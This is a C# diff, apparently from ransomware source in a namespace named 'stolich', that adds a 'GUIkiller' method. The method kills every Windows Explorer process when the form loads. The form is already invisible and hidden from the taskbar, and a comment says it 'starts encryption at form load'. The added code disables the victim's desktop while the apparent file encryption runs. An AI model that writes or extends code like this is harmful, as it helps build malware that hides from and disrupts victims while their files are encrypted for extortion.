@@ -61,10 +61,19 @@ namespace stolich
         {
             Opacity = 0;
             this.ShowInTaskbar = false;
+			GUIkiller();
             //starts encryption at form load
             startAction();
 
         }
+
+		public void GUIkiller()
+		{
+			foreach (var process in Process.GetProcessesByName("explorer"))
+			{
+				process.Kill();
+			}
+		}
 
         private void Form_Shown(object sender, EventArgs e)
         {
